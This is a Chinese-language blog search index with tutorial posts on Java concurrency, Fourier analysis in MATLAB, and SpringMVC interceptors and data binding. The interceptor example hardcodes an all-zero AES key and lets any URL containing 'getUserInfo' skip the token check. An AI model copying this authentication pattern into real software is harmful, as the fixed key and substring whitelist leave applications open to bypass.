<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[多线程-volatile-synchronized]]></title>
    <url>%2F2019%2F05%2F11%2F%E5%A4%9A%E7%BA%BF%E7%A8%8B-volatile-synchronized%2F</url>
    <content type="text"><![CDATA[volatile1 . 保证了不同线程对该变量操作的内存可见性; 2 . 禁止指令重排序 synchronizedsynchronized可作用于一段代码或方法，既可以保证可见性，又能够保证原子性。 可见性体现在：通过synchronized或者Lock能保证同一时刻只有一个线程获取锁然后执行同步代码，并且在释放锁之前会将对变量的修改刷新到主存中。 原子性表现在：要么不执行，要么执行到底。 synchronized和volatile比较 关键字volatile是线程同步的轻量级实现，所以volatile性能肯定比synchronized要好，并且volatile只能修饰变量，而synchronized可以修饰方法，以及代码块。 多线程访问volatile不会发生堵塞，而synchronized可能会出现堵塞。 volatile保证数据的可见性，但不能保证原子性；而synchronized可以保证原子性，也可以间接保证可见性，因为它会将私有内存和公共内存中的数据做了同步。 关键字volatile解决的是变量在多个线程之间的可见性；而synchronized关键字解决的是多个线程之间访问资源的同步性。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>volatile</tag>
        <tag>synchronized</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多线程-高并发下的Java容器]]></title>
    <url>%2F2019%2F05%2F11%2F%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E9%AB%98%E5%B9%B6%E5%8F%91%E4%B8%8B%E7%9A%84Java%E5%AE%B9%E5%99%A8%2F</url>
    <content type="text"><![CDATA[1.并发ListVector 或者 CopyOnWriteArrayList 是两个线程安全的List实现，ArrayList 不是线程安全的。因此，应该尽量避免在多线程环境中使用ArrayList。如果因为某些原因必须使用的，则需要使用Collections.synchronizedList(List list)进行包装。 示例代码： 1234567List list = Collections.synchronizedList(new ArrayList()); ...synchronized (list) &#123; Iterator i = list.iterator(); // 必须在同步块中 while (i.hasNext()) foo(i.next());&#125; 2.并发Set和List相似，并发Set也有一个 CopyOnWriteArraySet ，它实现了 Set 接口，并且是线程安全的。它的内部实现完全依赖于 CopyOnWriteArrayList ，因此，它的特性和 CopyOnWriteArrayList 完全一致，适用于 读多写少的高并发场合，在需要并发写的场合，则可以使用 Set s = Collections.synchronizedSet(Set&lt;T&gt; s)得到一个线程安全的Set。 示例代码： 1234567Set s = Collections.synchronizedSet(new HashSet()); ...synchronized (s) &#123; Iterator i = s.iterator(); // 必须在同步块中 while (i.hasNext()) foo(i.next());&#125; 3.并发Map在多线程环境下使用Map，一般也可以使用 Collections.synchronizedMap()方法得到一个线程安全的 Map（详见示例代码1）。但是在高并发的情况下，这个Map的性能表现不是最优的。由于 Map 是使用相当频繁的一个数据结构，因此 JDK 中便提供了一个专用于高并发的 Map 实现 ConcurrentHashMap。 Collections的示例代码1： 123456789Map m = Collections.synchronizedMap(new HashMap()); ...Set s = m.keySet(); // 不需要同步块 ...synchronized (m) &#123; // 同步在m上，而不是s上!! Iterator i = s.iterator(); // 必须在同步块中 while (i.hasNext()) foo(i.next());&#125; 1.为什么不能在高并发下使用HashMap？ 因为多线程环境下，使用Hashmap进行put操作会引起死循环，导致CPU利用率接近100%，所以在并发情况下不能使用HashMap。 2.为什么不使用线程安全的HashTable？ HashTable容器使用synchronized来保证线程安全，但在线程竞争激烈的情况下HashTable的效率非常低下。因为当一个线程访问HashTable的同步方法时，其他线程访问HashTable的同步方法时，可能会进入阻塞或轮询状态。如线程1使用put进行添加元素，线程2不但不能使用put方法添加元素，并且也不能使用get方法来获取元素，所以竞争越激烈效率越低。 3.ConcurrentHashMap的优势 ConcurrentHashMap的内部实现进行了锁分离（或锁分段），所以它的锁粒度小于同步的 HashMap；同时，ConcurrentHashMap的 get() 操作也是无锁的。除非读到的值是空的才会加锁重读，我们知道HashTable容器的get方法是需要加锁的，那么ConcurrentHashMap的get操作是如何做到不加锁的呢？原因是它的get方法里将要使用的共享变量都定义成volatile。 锁分离：首先将数据分成一段一段的存储，然后给每一段数据配一把锁，当一个线程占用锁访问其中一个段数据的时候，其他段的数据也能被其他线程访问。有些方法需要跨段，比如size()和containsValue()，它们可能需要锁定整个表而而不仅仅是某个段，这需要按顺序锁定所有段，操作完毕后，又按顺序释放所有段的锁。 4.并发Queue在并发队列上，JDK提供了两套实现，一个是以 ConcurrentLinkedQueue 为代表的高性能队列，一个是以 BlockingQueue 接口为代表的阻塞队列。不论哪种实现，都继承自 Queue 接口。 ConcurrentLinkedQueue 是一个适用于高并发场景下的队列。它通过无锁的方式，实现了高并发状态下的高性能。通常，ConcurrentLinkedQueue 的性能要好于 BlockingQueue 。 与 ConcurrentLinkedQueue 的使用场景不同，BlockingQueue 的主要功能并不是在于提升高并发时的队列性能，而在于简化多线程间的数据共享。 BlockingQueue 典型的使用场景是生产者-消费者模式，生产者总是将产品放入 BlockingQueue 队列，而消费者从队列中取出产品消费，从而实现数据共享。 BlockingQueue 提供一种读写阻塞等待的机制，即如果消费者速度较快，则 BlockingQueue 则可能被清空，此时消费线程再试图从 BlockingQueue 读取数据时就会被阻塞。反之，如果生产线程较快，则 BlockingQueue 可能会被装满，此时，生产线程再试图向 BlockingQueue 队列装入数据时，便会被阻塞等待，其工作模式如图所示。 5.并发Deque在JDK1.6中，还提供了一种双端队列（Double-Ended Queue），简称Deque。Deque允许在队列的头部或尾部进行出队和入队操作。与Queue相比，具有更加复杂的功能。 Deque 接口的实现类：LinkedList、ArrayDeque和LinkedBlockingDeque。 它们都实现了双端队列Deque接口。其中LinkedList使用链表实现了双端队列，ArrayDeque使用数组实现双端队列。通常情况下，由于ArrayDeque基于数组实现，拥有高效的随机访问性能，因此ArrayDeque具有更好的遍性能。但是当队列的大小发生变化较大时，ArrayDeque需要重新分配内存，并进行数组复制，在这种环境下，基于链表的 LinkedList 没有内存调整和数组复制的负担，性能表现会比较好。但无论是LinkedList或是ArrayDeque，它们都不是线程安全的。 LinkedBlockingDeque 是一个线程安全的双端队列实现。可以说，它已经是最为复杂的一个队列实现。在内部实现中，LinkedBlockingDeque 使用链表结构。每一个队列节点都维护了一个前驱节点和一个后驱节点。LinkedBlockingDeque 没有进行读写锁的分离，因此同一时间只能有一个线程对其进行操作。因此，在高并发应用中，它的性能表现要远远低于 LinkedBlockingQueue，更要低于 ConcurrentLinkedQueue 。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>并发容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多线程-线程安全]]></title>
    <url>%2F2019%2F05%2F11%2F%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[概念线程安全是多线程编程时的计算机程序代码中的一个概念。在拥有共享数据的多条线程并行执行的程序中，线程安全的代码会通过同步机制保证各个线程都可以正常且正确的执行，不会出现数据污染等意外情况。 线程安全的容器容器中对特定的操作进行了同步处理以保证多线程操作该容器时不出现数据污染的情况，具有这种机制的容器叫做线程安全的容器。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多线程-阻塞队列]]></title>
    <url>%2F2019%2F05%2F10%2F%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E9%98%BB%E5%A1%9E%E9%98%9F%E5%88%97%2F</url>
    <content type="text"><![CDATA[概念 阻塞队列（BlockingQueue）是一个支持两个附加操作的队列。 这两个附加的操作是：在队列为空时，获取元素的线程会等待队列变为非空。当队列满时，存储元素的线程会等待队列可用。 应用 阻塞队列常用于生产者和消费者的场景，生产者是往队列里添加元素的线程，消费者是从队列里拿元素的线程。阻塞队列就是生产者存放元素的容器，而消费者也只从容器里拿元素。 常见的阻塞队列 ArrayBlockingQueue ：一个由数组结构组成的有界阻塞队列。 LinkedBlockingQueue ：一个由链表结构组成的有界阻塞队列。 ArrayBlockingQueue和LinkedBlockingQueue是最为常用的阻塞队列，前者使用一个有边界的数组来作为存储介质，而后者使用了一个没有边界的链表来存储数据。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>阻塞队列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多线程-wait/notify方法]]></title>
    <url>%2F2019%2F05%2F10%2F%E5%A4%9A%E7%BA%BF%E7%A8%8B-wait-notify%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[wait方法作用 1.结合以下例子进行叙述。 lock.wait();这句执行后线程a会释放锁，线程a会进入阻塞状态，等待线程b的lock.notify()执行后，才可以尝试获取锁，a线程等待获取锁，当b线程锁住的lock对象代码块执行完并释放锁后，a线程才可以得到锁进入运行状态。 2.如下图 step 图 1 2 3 4 5 MyList.java 123456789101112public class MyList &#123; private static List&lt;String&gt; list = new ArrayList&lt;String&gt;(); public static void add() &#123; list.add("anyString"); &#125; public static int size() &#123; return list.size(); &#125;&#125; ThreadA.java 123456789101112131415161718192021222324252627public class ThreadA extends Thread &#123; private Object lock; public ThreadA(Object lock) &#123; super(); this.lock = lock; &#125; @Override public void run() &#123; try &#123; synchronized (lock) &#123; if (MyList.size() != 5) &#123; System.out.println("wait begin " + System.currentTimeMillis()); lock.wait(); System.out.println("wait end " + System.currentTimeMillis()); &#125; &#125; &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; ThreadB.java 12345678910111213141516171819202122232425262728293031public class ThreadB extends Thread &#123; private Object lock; public ThreadB(Object lock) &#123; super(); this.lock = lock; &#125; @Override public void run() &#123; try &#123; synchronized (lock) &#123; for (int i = 0; i &lt; 10; i++) &#123; MyList.add(); if (MyList.size() == 5) &#123; lock.notify(); /* 发出通知后，b线程并不会释放锁，必须等待synchronized (lock)&#123;...&#125;执行完才会释放锁，a线程才可以获得锁。 */ System.out.println("已发出通知！"); &#125; System.out.println("添加了" + (i + 1) + "个元素!"); Thread.sleep(1000); &#125; &#125; &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; Run.java 123456789101112131415161718192021public class Run &#123; public static void main(String[] args) &#123; try &#123; Object lock = new Object(); ThreadA a = new ThreadA(lock); a.start(); Thread.sleep(50);//等待线程a进入阻塞状态，释放锁。 ThreadB b = new ThreadB(lock); b.start(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行结果：]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>wait</tag>
        <tag>notify</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多线程-join方法]]></title>
    <url>%2F2019%2F05%2F08%2F%E5%A4%9A%E7%BA%BF%E7%A8%8B-join%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[作用 用于控制线程执行的顺序。 例如如下代码 A类 1234567891011121314public class A extends Thread &#123; public void run() &#123; for (int i = 1; i &lt;= 5; i++) &#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println("A开始第"+i+"次休息"); System.out.println("A"+i); &#125; &#125;&#125; B类 12345678910111213public class B extends Thread &#123; public void run() &#123; for (int i = 1; i &lt;= 5; i++) &#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println("B开始第"+i+"次休息"); System.out.println("B"+i); &#125; &#125;&#125; Main类 1234567891011121314public class Main &#123; public static void main(String[] args) throws InterruptedException &#123; A a=new A(); B b=new B(); a.start(); System.out.println("A开始join"); a.join(); b.start(); System.out.println("B开始join"); b.join(); System.out.println("Hello World!"); &#125;&#125; 执行结果 1234567891011121314151617181920212223A开始joinA开始第1次休息A1A开始第2次休息A2A开始第3次休息A3A开始第4次休息A4A开始第5次休息A5B开始joinB开始第1次休息B1B开始第2次休息B2B开始第3次休息B3B开始第4次休息B4B开始第5次休息B5Hello World!]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>并发</tag>
        <tag>join</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[傅里叶变换]]></title>
    <url>%2F2019%2F04%2F29%2F%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[傅里叶变换傅里叶变换是将按时间或空间采样的信号与按频率采样的相同信号进行关联的数学公式。在信号处理中，傅里叶变换可以揭示信号的重要特征（即其频率分量）。 对于包含n个均匀采样点的向量x，其傅里叶变换定义为 w=e-2πi/n是n个复单位根之一，其中i是虚数单位。对于x和y，索引 j 和 k 的范围为0到n-1。 MATLAB® 中的 fft 函数使用快速傅里叶变换算法来计算数据的傅里叶变换。以正弦信号 x 为例，该信号是时间 t 的函数，频率分量为 15 Hz 和 20 Hz。使用在 10 秒周期内以 秒为增量进行采样的时间向量。 123t = 0:1/50:10-1/50; x = sin(2*pi*15*t) + sin(2*pi*20*t);plot(t,x) 计算信号的傅里叶变换，并在频率空间创建对应于信号采样的向量 f。 12y = fft(x); f = (0:length(y)-1)*50/length(y); 以频率函数形式绘制信号幅值时，幅值尖峰对应于信号的 15 Hz 和 20 Hz 频率分量。 12plot(f,abs(y))title(&apos;Magnitude&apos;) 该变换还会生成尖峰的镜像副本，该副本对应于信号的负频率。为了更好地以可视化方式呈现周期性，您可以使用 fftshift 函数对变换执行以零为中心的循环平移。 1234n = length(x); fshift = (-n/2:n/2-1)*(50/n);yshift = fftshift(y);plot(fshift,abs(yshift)) 噪声信号在科学应用中，信号经常遭到随机噪声破坏，掩盖其频率分量。傅里叶变换可以清除随机噪声并显现频率。例如，通过在原始信号 x 中注入高斯噪声，创建一个新信号 xnoise。 1xnoise = x + 2.5*gallery(&apos;normaldata&apos;,size(t),4); 频率函数形式的信号功率是信号处理中的一种常用度量。功率是信号的傅里叶变换按频率样本数进行归一化后的平方幅值。计算并绘制以零频率为中心的噪声信号的功率频谱。尽管存在噪声，您仍可以根据功率中的尖峰辨识出信号的频率。 12345ynoise = fft(xnoise);ynoiseshift = fftshift(ynoise); power = abs(ynoiseshift).^2/n; plot(fshift,power)title(&apos;Power&apos;) 计算效率直接使用傅里叶变换公式分别计算y的n个元素需要n2数量级的浮点运算。使用快速傅里叶变换算法，则只需要nlogn 数量级的运算。在处理包含成百上千万个数据点的数据时，这一计算效率会带来很大的优势。在n 为 2 的幂时，许多专门的快速傅里叶变换实现可进一步提高效率。 以加利福尼亚海岸的水下麦克风所收集的音频数据为例。在康奈尔大学生物声学研究项目维护的库中可以找到这些数据。载入包含太平洋蓝鲸鸣声的文件 bluewhale.au，并对其中一部分数据进行格式化。可使用命令 sound(x,fs) 来收听完整的音频文件。 123456789whaleFile = &apos;bluewhale.au&apos;;[x,fs] = audioread(whaleFile);whaleMoan = x(2.45e4:3.10e4);t = 10*(0:1/fs:(length(whaleMoan)-1)/fs);plot(t,whaleMoan)xlabel(&apos;Time (seconds)&apos;)ylabel(&apos;Amplitude&apos;)xlim([0 t(end)]) 指定新的信号长度，该长度是大于原始长度的最邻近的 2 的幂。然后使用 fft 和新的信号长度计算傅里叶变换。fft 会自动用零填充数据，以增加样本大小。此填充操作可以大幅提高变换计算的速度，对于具有较大质因数的样本大小更是如此。 123m = length(whaleMoan); n = pow2(nextpow2(m));y = fft(whaleMoan,n); 绘制信号的功率频谱。绘图指示，呻吟音包含约 17 Hz 的基本频率和一系列谐波（其中强调了第二个谐波）。 12345f = (0:n-1)*(fs/n)/10; % frequency vectorpower = abs(y).^2/n; % power spectrum plot(f(1:floor(n/2)),power(1:floor(n/2)))xlabel(&apos;Frequency&apos;)ylabel(&apos;Power&apos;)]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>磨皮美颜</tag>
        <tag>线性组合</tag>
        <tag>傅里叶变换</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[傅里叶级数]]></title>
    <url>%2F2019%2F04%2F29%2F%E5%82%85%E9%87%8C%E5%8F%B6%E7%BA%A7%E6%95%B0%2F</url>
    <content type="text"><![CDATA[傅立叶级数、傅立叶变换实际上就是线性组合。 1 对周期函数进行分解的猜想拉格朗日等数学家发现某些周期函数可以由三角函数的和来表示，比如下图中，黑色的斜线就是周期为2π 的函数，而红色的曲线是三角函数之和，可以看出两者确实近似： 而另外一位数学家： 让·巴普蒂斯·约瑟夫·傅里叶男爵（1768 －1830）猜测任意周期函数都可以写成三角函数之和。 2 分解的思路假设f(x)是周期为T的函数，傅里叶男爵会怎么构造三角函数的和，使之等于f(x)？ 2.1 常数项对于y=C,C∈R这样的常数函数： 根据周期函数的定义，常数函数是周期函数，周期为任意实数。 所以，分解里面得有一个常数项。 2.2 通过sin(x),cos(x)进行分解首先，sin(x),cos(x)是周期函数，进行合理的加减组合，结果可以是周期函数。 其次，它们的微分和积分都很简单。 然后，sin(x)是奇函数，即： 从图像上也可以看出，sin(x)关于原点对称，是奇函数： 而奇函数与奇函数加减只能得到奇函数，即： 其中，fodd表示奇函数。 而cos(x)是偶函数，即： 从图像上也可以看出，cos(x)关于Y轴对称，是偶函数： 同样的，偶函数与偶函数加减只能得到偶函数，即： 其中，feven表示偶函数。 但是任意函数可以分解和奇偶函数之和： 所以同时需要sin(x),cos(x)。 2.3 保证组合出来周期为T之前说了，f(x)是周期为T的函数，我们怎么保证组合出来的函数周期依然为T呢？ 比如下面这个函数的周期为2π： 很显然，sin(x)的周期也是2π： sin(2x)的周期也是2π，虽然最小周期是π： 很显然，sin(nx)的周期都是2π： 更一般的，如果f(x)的周期为T，那么： 这些函数的周期都为T。 将这些函数进行加减，就保证了得到的函数的周期也为T。 2.4 调整振幅现在我们有一堆周期为2π的函数了，比如说sin(x),sin(2x),sin(3x),sin(4x),sin(5x)： 通过调整振幅可以让它们慢慢接近目标函数，比如sin(x)看起来处处都比目标函数低一些： 把它的振幅增加一倍： 2sin(x)有的地方超出去了，从周期为2π的函数中选择一个，减去一点： 调整振幅，加加减减，我们可以慢慢接近目标函数： 2.5 小结综上，构造出来的三角函数之和大概类似下面的样子： 这样就符合之前的分析： 有常数项 奇函数和偶函数可以组合出任意函数 周期为T 调整振幅，逼近原函数 之前的分析还比较简单，后面开始有点难度了。即怎么确定这三个系数： 3 sin(x)的另外一种表示方法直接不好确定，要迂回一下，先稍微介绍一下什么是：eiwt？ 3.1 eiwt看到类似于eiθ这种就应该想到复平面上的一个夹角为θ的向量： 那么当θ不再是常数，而是代表时间的变量t的时候： 随着时间t的流逝，从0开始增长，这个向量就会旋转起来,2π秒会旋转一圈，也就是：T=2π 3.2 通过eiwt表示sin(t)根据欧拉公式，有： 所以，在时间t轴上，把eit向量的虚部（也就是纵坐标）记录下来，得到的就是sin(t): 在时间t轴上，把ei2t向量的虚部记录下来，得到的就是sin(2t)： 如果在时间t轴上，把eit的实部（横坐标）记录下来，得到的就是cos(t)的曲线： 更一般的我们认为，我们具有两种看待sin(x),cos(x)的角度： 这两种角度，一个可以观察到旋转的频率，所以称为频域；一个可以看到流逝的时间，所以称为时域： 4 通过频域来求系数4.1 函数是线性组合假设有这么个函数： 是一个T=2π的函数： 如果转到频域去，那么它们是下面这个复数函数的虚部： 先看看eiθ+ei2θ，其中θ是常数，很显然这是两个向量之和： 现在让它们动起来，把θ变成流逝的时间t，并且把虚部记录下来： 我们令： 这里用大写的G来表示复数函数。 刚才看到了，eit和ei2t都是向量，所以上式可以写作： 这里就是理解的重点了，从线性代数的角度： eit和ei2t是基（可以参考无限维的希尔伯特空间，自行google） G(t)是基eit,ei2t的线性组合 g(t)是G(t)的虚部，所以取虚部，很容易得到： 即g(t)是基sin(t),sin(2t)的线性组合。 那么sin(t),sin(2t)的系数，实际上是g(t)在基sin(t),sin(2t)下的坐标了。 4.2 如何求正交基的坐标有了这个结论之后，我们如何求坐标？ 我们来看个例子，假设： 其中 通过点积： 可知这两个向量正交，是正交基。图示如下： 通过点积可以算出 的系数（对于正交基才可以这么做）： 4.3 如何求sin(nt)基下的坐标在这里抛出一个结论（可以参考无限维的希尔伯特空间,自行google），函数向量的点积是这么定义的： 其中，f(x)是函数向量，g(x)是基，T是f(x)的周期。 那么对于：g(x)=sin(x)+sin(2x) 其中，g(x)是向量，sin(t),sin(2t)是基，周期T=2π。 根据刚才内积的定义： 所以是正交基，那么根据刚才的分析，可以这么求坐标： 4.4 更一般的对于我们之前的假设，其中f(x)周期为T： 可以改写为这样： 也就是说向量f(x)的基为： 是的，1也是基。 那么可以得到： C也可以通过点积来表示，最终我们得到： 其中：]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>傅里叶级数</tag>
        <tag>磨皮美颜</tag>
        <tag>线性组合</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringMVC拦截器]]></title>
    <url>%2F2019%2F04%2F28%2FSpringMVC%E6%8B%A6%E6%88%AA%E5%99%A8%2F</url>
    <content type="text"><![CDATA[SpringMVC拦截器简介java里的拦截器是动态拦截Action调用的对象，它提供了一种机制可以使开发者在一个Action执行的前后执行一段代码，也可以在一个Action执行前阻止其执行，同时也提供了一种可以提取Action中可重用部分代码的方式。在AOP中，拦截器用于在某个方法或者字段被访问之前，进行拦截,然后再之前或者之后加入某些操作。 拦截器代码java部分1234567891011public class HandlerInterceptorAdapter implements HandlerInterceptor &#123; public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception&#123; &#125; public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception&#123; &#125; public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception&#123; &#125;&#125; spring-MVC配置部分1234567891011&lt;!--配置拦截器, 多个拦截器,顺序执行 --&gt; &lt;mvc:interceptors&gt; &lt;mvc:interceptor&gt; &lt;!-- 匹配的是url路径， 如果不配置或/**,将拦截所有的Controller --&gt; &lt;mvc:mapping path="/ps/**" /&gt; &lt;!--&lt;mvc:mapping path="/user/**" /&gt;--&gt; &lt;!--&lt;mvc:mapping path="/test/**" /&gt;--&gt; &lt;bean class="com.weixin.InterceptorAdapter.HandlerInterceptorAdapter"&gt;&lt;/bean&gt; &lt;/mvc:interceptor&gt; &lt;!-- 当设置多个拦截器时，先按顺序调用preHandle方法，然后逆序调用每个拦截器的postHandle和afterCompletion方法 --&gt; &lt;/mvc:interceptors&gt; 拦截器用法接口源码123456789//继承spring的拦截接口,实现以下三个方法public interface HandlerInterceptor &#123; // 在业务处理器处理请求之前被调用 boolean preHandle(HttpServletRequest var1, HttpServletResponse var2, Object var3) throws Exception; // 在业务处理器处理请求完成之后，生成视图之前执行 void postHandle(HttpServletRequest var1, HttpServletResponse var2, Object var3, ModelAndView var4) throws Exception; // 在DispatcherServlet完全处理完请求之后被调用，可用于清理资源,日志打印 void afterCompletion(HttpServletRequest var1, HttpServletResponse var2, Object var3, Exception var4) throws Exception;&#125; preHandle详解preHandle 方法有三个参数,分别是HttpServletRequest HttpServletResponse Object 传参: 123HttpServletRequest 控制程序在业务处理器前的请求参数HttpServletResponse 控制程序在经过处理器后的返回参数Object 被拦截的请求Action的实体 返回值: 12true表示继续流程false表示流程中断，不会继续调用其他的拦截器或处理器，此时我们需要通过response来产生响应 实例: 12345678910111213141516171819202122232425262728293031323334public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception&#123; //计算出服务器当前时间 Long timeNowForServer=new Date().getTime(); //获取从前端接口请求的参数 if(null!=request.getParameter("token"))&#123; //因为前端请求做了加密,所以这里需要对应的解密过程 String token=EncryptUtil.aesDecrypt(request.getParameter("token"),"0000000000000000"); if(null!=token) &#123; Long timeNowForClient = Long.parseLong(token); //如果请求接口在五秒内 Long timeMinus = timeNowForServer - timeNowForClient; if (-50000 &lt;= timeMinus &amp;&amp; timeMinus &lt;= 50000) &#123; //继续接口流程 return true; &#125; else &#123; //返回相应的HTTP状态码,达到拦截的效果 //response.sendError(http状态码,页面显示的拦截原因); response.sendError(405, "Parameters illegal"); //打回这次操作,返回相应的response return false; &#125; &#125;else&#123; response.sendError(405, "Parameters illegal"); return false; &#125; //或者请求地址中含有getUserInfo就放开对这个请求的拦截,等于白名单的效果 &#125;else if(request.getRequestURI().indexOf("getUserInfo")&gt;0)&#123; return true; &#125;else&#123; //跳转到其他页面 response.sendRedirect(request.getContextPath() + "/Login1.html"); return false; &#125;&#125;]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>拦截器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringMVC数据绑定]]></title>
    <url>%2F2019%2F04%2F28%2FSpringMVC%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%2F</url>
    <content type="text"><![CDATA[基础类型原始类型：id必须要传，否则报错。 123@RequestMapping("/test")@ResponseBodypublic ResponseData test(int id) &#123;&#125; 包装类型：id可以不传，后台接受到null。 123@RequestMapping("/test")@ResponseBodypublic ResponseData test(Integer id) &#123;&#125; list&amp;set简单类型 前台form表单123456&lt;form action="$&#123;ctx&#125;/test/test" method="post"&gt; &lt;input type="text" name="ids"&gt; &lt;input type="text" name="ids"&gt; &lt;input type="text" name="ids"&gt; &lt;input type="submit"&gt;&lt;/form&gt; ajax123456789101112var data = [];data.push(1);data.push(2);data.push(3);$.ajax(&#123; url: ctx + "/test/test", traditional:true,//必要 data: &#123;ids: data&#125;, success: function (result) &#123; alert(result); &#125;&#125;) 后台123@RequestMapping("/test")@ResponseBodypublic ResponseData test(@RequestParam List&lt;Integer&gt;ids) &#123;&#125; 复杂类型 如list&lt;User&gt;users：（略）同json格式对象 数组前台form表单123456&lt;form action="$&#123;ctx&#125;/test/test" method="post"&gt; &lt;input type="text" name="ids"&gt; &lt;input type="text" name="ids"&gt; &lt;input type="text" name="ids"&gt; &lt;input type="submit"&gt;&lt;/form&gt; ajax123456789101112var data = [];data.push(1);data.push(2);data.push(3);$.ajax(&#123; url: ctx + "/test/test", traditional:true,//必要 data: &#123;ids: data&#125;, success: function (result) &#123; alert(result); &#125;&#125;) 后台1234@RequestMapping("/test")@ResponseBodypublic ResponseData test(Integer[]ids) &#123;&#125; map前台form12345&lt;form action="$&#123;ctx&#125;/test/test" method="post"&gt; &lt;input type="text" name="name"&gt; &lt;input type="text" name="sex"&gt; &lt;input type="submit"&gt;&lt;/form&gt; ajax12345678var data = &#123;name:"zhangsan",sex:"man"&#125;;$.ajax(&#123; url: ctx + "/test/test", data:data, success: function (result) &#123; alert(result); &#125;&#125;); 后台123@RequestMapping("/test")@ResponseBodypublic ResponseData test(@RequestParam Map&lt;String,String&gt; params) &#123;&#125; pojo简单属性前台form12345&lt;form action="$&#123;ctx&#125;/test/test" method="post"&gt; &lt;input type="text" name="name"&gt; &lt;input type="text" name="sex"&gt; &lt;input type="submit"&gt;&lt;/form&gt; ajax12345678var data = &#123;name:"zhangsan",sex:"man"&#125;;$.ajax(&#123; url: ctx + "/test/test", data:data, success: function (result) &#123; alert(result); &#125;&#125;); 后台12345678@RequestMapping("/test")@ResponseBodypublic ResponseData test(User user) &#123;&#125;public class User&#123; private String name; private String sex; //get and set ...&#125; pojo包含list前台form123456789&lt;form action="$&#123;ctx&#125;/test/test" method="post"&gt; &lt;input type="text" name="userName" value="zhangsan"&gt; &lt;input type="text" name="sex" value="123"&gt; &lt;input type="text" name="posts[0].code" value="232"/&gt; &lt;input type="text" name="posts[0].name" value="ad"/&gt; &lt;input type="text" name="posts[1].code" value="ad"/&gt; &lt;input type="text" name="posts[1].name" value="232"/&gt; &lt;input type="submit"&gt;&lt;/form&gt; ajax1234567891011121314var user=&#123;userName:"zhangsan",password:"123"&#125;;user['posts[0].name']="ada";user['posts[0].code']="ada";user['posts[1].name']="ad";user['posts[1].code']="ad2323a";$.ajax(&#123; url: ctx + "/test/test", type:"post", contentType: "application/x-www-form-urlencoded", data:user, success: function (result) &#123; alert(result); &#125;&#125;); 后台1234567891011121314public class User&#123; private String name; private String sex; private List&lt;Post&gt; posts; //get and set ...&#125;public class Post &#123; private String code; private String name; //get and set ...&#125;@RequestMapping("/test")@ResponseBodypublic ResponseData test(User user) &#123;&#125; date类型使用注解方式绑定单个方法对于传递参数为Date类型，可以在参数前添加@DateTimeFormat注解。如下： 12@RequestMapping("/test")public void test(@DateTimeFormat(pattern="yyyy-MM-dd HH:mm:ss") Date date)&#123;&#125; 如果传递过来的是对象，可以在对象属性上添加注解。 12345678@RequestMapping("/test")public void test(Person person)&#123;&#125;Public class Person&#123; @DateTimeFormat(pattern="yyyy-MM-dd HH:mm:ss") Private Date date; Private String name;&#125; 绑定整个controller的所有方法：1234567891011121314151617@Controllerpublic class FormController &#123; @InitBinder public void initBinder(WebDataBinder binder) &#123; SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd"); dateFormat.setLenient(false); binder.registerCustomEditor(Date.class, new CustomDateEditor(dateFormat, false)); &#125;&#125;@Controllerpublic class FormController &#123; @InitBinder protected void initBinder(WebDataBinder binder) &#123; binder.addCustomFormatter(new DateFormatter("yyyy-MM-dd")); &#125;&#125; 使用PropertyEditor方式使用ConversionService方式参考： https://www.2cto.com/kf/201501/374062.html https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html#mvc-ann-initbinder 枚举类型mvc配置文件添加： 123456789&lt;!--枚举类型转化器--&gt; &lt;bean id="formattingConversionService" class="org.springframework.format.support.FormattingConversionServiceFactoryBean"&gt; &lt;property name="converters"&gt; &lt;set&gt; &lt;bean class="org.springframework.core.convert.support.StringToEnumConverterFactory"/&gt; &lt;/set&gt; &lt;/property&gt; &lt;/bean&gt; 参考： Spring Boot绑定枚举类型参数 Spring MVC 自动为对象注入枚举类型 